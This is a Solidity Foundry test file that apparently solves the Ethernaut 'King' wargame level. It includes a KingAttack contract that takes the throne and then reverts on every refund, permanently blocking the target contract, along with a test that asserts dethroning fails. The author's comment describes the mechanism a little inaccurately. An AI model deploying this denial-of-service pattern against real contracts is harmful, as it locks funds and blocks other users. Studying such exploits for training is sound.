// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {King} from "../src/King.sol";

contract KingAttack {
    address payable public kingContract;

    constructor(address payable _kingContract) payable {
        kingContract = _kingContract;

        // Send enough ETH to become the King
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "Failed to become king");
    }

    // When King tries to pay us back, REVERT
    receive() external payable {
        revert("You can't dethrone me");
    }
}

contract KingTest is Test {
    /*
     * My aim is to transfer an amount that is greater than the current prize amount, and become the king.
     * Then when the next time someone else tries to send greater amount then me and become king,
     * my receive function gets activated, I again send same amount of ether and DoS the contract.
     *
     */
    King public kingTest;
    address public deployer = address(0xAAA1);
    address public player = address(0xBEEF);

    function setUp() public {
        vm.deal(deployer, 10 ether);
        vm.deal(player, 10 ether);

//        From now on, every transaction is sent as deployer
//        So msg.sender = deployer
        vm.startPrank(deployer);
        kingTest = new King{value: 1 ether}();
        vm.stopPrank();
    }

    function testKingAttack() public {
        vm.startPrank(player);

        KingAttack attacker = new KingAttack{value: 2 ether}(payable(address(kingTest)));

        assertEq(kingTest._king(), address(attacker));

        vm.stopPrank();

        // 🧪 Try dethroning — should fail
        vm.deal(address(1), 5 ether);
        vm.prank(address(1));

        vm.expectRevert();
        (bool success,) = payable(address(kingTest)).call{value: 5 ether}("");
        success;
    }
}
